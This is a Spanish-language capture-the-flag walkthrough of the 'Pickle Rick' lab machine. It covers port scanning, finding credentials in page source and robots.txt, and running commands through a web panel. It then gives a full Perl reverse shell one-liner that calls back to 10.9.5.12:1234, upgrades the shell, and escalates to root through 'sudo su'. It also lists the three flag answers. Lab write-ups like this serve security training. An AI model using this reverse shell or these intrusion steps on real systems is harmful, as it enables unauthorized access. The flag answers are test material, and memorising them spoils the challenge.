# Pickle Rick

Primero realizamos un escaneo de puertos con **Nmap** para visualizar que servicios tiene corriendo dentro de la máquina de tal manera recopilamos información para posteriormente evaluar las vulnerabilidades y tratar de explotarlas.

![](https://github.com/Mr-r00t11/CTF-Walkthrough/blob/main/Pickle%20Rick/src/nmap.png)


Vemos un puerto interesante y es el 80, el cual significa que esta alojado un servidor web en dicho puerto, accedemos a la direccion ip de la maquinas desde el navegador para revisar si existe alguna pagina web.

![](https://github.com/Mr-r00t11/CTF-Walkthrough/blob/main/Pickle%20Rick/src/pagina%20web.png)

Revisamos que hay una pagina web, ahora debemos revisar el codigo fuente de la pagina y ver si podemos encontrar algo.

![](https://github.com/Mr-r00t11/CTF-Walkthrough/blob/main/Pickle%20Rick/src/codigo%20fuente.png)

Podemos encontrar un nombre de usuario dentro de la pagina web, el cual es el siguiente:

    Username: R1ckRul3s 

Ahora realizamos un ataque de fuerza bruta para descubrir los directorios ocultos dentro del servidor de pagina web.

![](https://github.com/Mr-r00t11/CTF-Walkthrough/blob/main/Pickle%20Rick/src/gobuster.png)

Encontramos un archivo muy importante que la mayoria de los servidores web tienen, dicho archivo es llamado "**robots.txt**" el cual contiene las rutas no indexadas de la pagina web, ahora vamos a leer el archivo y visualizar que contiene adentro.

![](https://github.com/Mr-r00t11/CTF-Walkthrough/blob/main/Pickle%20Rick/src/robots.png)

Podemos observar que contiene una palabra muy peculiar, la cual debemos guardar ya que posiblemente pueda tratarse de una contraseña.

     Wubbalubbadubdub

Ahora volvemos a realizar el descubrimiento de directorios y podemos observar que existe un archivo llamado "**login.php**".

![](https://github.com/Mr-r00t11/CTF-Walkthrough/blob/main/Pickle%20Rick/src/login.png)

 Accedemos a ese directorio.
 
 ![](https://github.com/Mr-r00t11/CTF-Walkthrough/blob/main/Pickle%20Rick/src/portal%20login.png)

Ingresamos las posibles credenciales que hemos encontrado:

      R1ckRul3s
      Wubbalubbadubdub

Al intentar ingresar las posibles credenciales nos da un login exitoso, visualizamos una pagina que parece ser una especie pagina para ejecutar comandos dentro de la maquina.

![](https://github.com/Mr-r00t11/CTF-Walkthrough/blob/main/Pickle%20Rick/src/page%20commands.png)

 Intentamos ejecutar un comando simple como "**ls**".
 
 ![](https://github.com/Mr-r00t11/CTF-Walkthrough/blob/main/Pickle%20Rick/src/ls.png)
 
Vemos que si se ejecuto de manera exitosa el comando, visualizamos una lista de archivos el cual nos interesa uno llamado "**Sup3rS3cretPickl3Ingred.txt**", intentamos leer su contenido.

![](https://github.com/Mr-r00t11/CTF-Walkthrough/blob/main/Pickle%20Rick/src/cat%20Sup3rS3cretPickl3Ingred.txt.png)

Nos salta un error ya que el comando "**cat**" esta deshabilitado para el servidor remoto, intentemos leer el archivo con otro comando de lectura llamado "**strings**".

     	strings Sup3rS3cretPickl3Ingred.txt

![](https://github.com/Mr-r00t11/CTF-Walkthrough/blob/main/Pickle%20Rick/src/strings%20Sup3rS3cretPickl3Ingred.txt.png)

#### What is the first ingredient Rick needs?
mr. meeseek hair

Una vez visualizando que podemos ejecutar comandos de linux podemos deducir que es posible escribir una "**Reverse Shell**" para poder acceder al servidor directamente.

      perl -e 'use Socket;$i="10.9.5.12";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

Antes de ejecutar la "Reverse Shell", debemos poner a la escucha "**netcat**".

![](https://github.com/Mr-r00t11/CTF-Walkthrough/blob/main/Pickle%20Rick/src/netcat.png)

##### ¡Estamos dentro!
Ahora ejecutamos el comando de "**whoami**".

![](https://github.com/Mr-r00t11/CTF-Walkthrough/blob/main/Pickle%20Rick/src/whoami.png)

# Shell Upgrading

Para trabajar mas comodo vamos a realizar una "Shell Upgrading", ejecutamos lo siguiente en la terminal:

    	/usr/bin/script -qc /bin/bash /dev/null

![](https://github.com/Mr-r00t11/CTF-Walkthrough/blob/main/Pickle%20Rick/src/shell%20upgrading.png)

Una vez realizando la actualizacion de la shell, buscamos la segunda bandera, **siempre debemos buscar dentro de las carpetas de /home/**.

![](https://github.com/Mr-r00t11/CTF-Walkthrough/blob/main/Pickle%20Rick/src/home-ls.png)

Nos aparece dos carpetas, accedemos a la carpeta llamada "**rick**" y ejecutamos el comando "**ls**" y vemos un archivo llamado "**second ingredients**" y obtenemos la segunda bandera.

![](https://github.com/Mr-r00t11/CTF-Walkthrough/blob/main/Pickle%20Rick/src/second%20secret.png)

#### Whats the second ingredient Rick needs?
1 jerry tear

![](https://github.com/Mr-r00t11/CTF-Walkthrough/blob/main/Pickle%20Rick/src/cat%20second%20ingredients.png)

#Privilege Escalation
Debemos encontrar algun script que tenga permisos de ejecucion root para poder aprovecharnos de el, en linux se les conoce como "**SUID Binaries**", para poder encontrar dichos archivos debemos ejecutar lo siguiente:

    	find / -perm -4000 2>/dev/null
Nos aparecera lo siguiente:

![](https://github.com/Mr-r00t11/CTF-Walkthrough/blob/main/Pickle%20Rick/src/suid%20su.png)

El binario que nos importa es uno llamado "**/bin/su**", para verificar que como se puede explotar, vamos a consultar la pagina [GTFOBins](https://gtfobins.github.io/) y buscamos el binario "**su**".

![](https://github.com/Mr-r00t11/CTF-Walkthrough/blob/main/Pickle%20Rick/src/su.png)

Ahora escribimos el resultado que nos mostro **GTFOBins** para escalar privilegios:

    	sudo su

### ¡Ahora tu servidor es mío!
Hemos escalado privilegios, para confirmar que efectivamente fue asi, ejecutamos "**whoami**".

![](https://github.com/Mr-r00t11/CTF-Walkthrough/blob/main/Pickle%20Rick/src/root.png)

Cambiamos a la carpeta de "**/root**" y revisamos su contenido de dicha carpeta.

![](https://github.com/Mr-r00t11/CTF-Walkthrough/blob/main/Pickle%20Rick/src/cd%20root.png)

podemos encontrar la ultima bandera que nos falta, leemos el archivo "**3rd.txt**".

#### Whats the final ingredient Rick needs?
3rd ingredients: fleeb juice

![](https://github.com/Mr-r00t11/CTF-Walkthrough/blob/main/Pickle%20Rick/src/cat%203rd%20ingredients:%20fleeb%20juice.png)

Hemos finalizado el reto hasta llegar a ser **owner** del servidor.
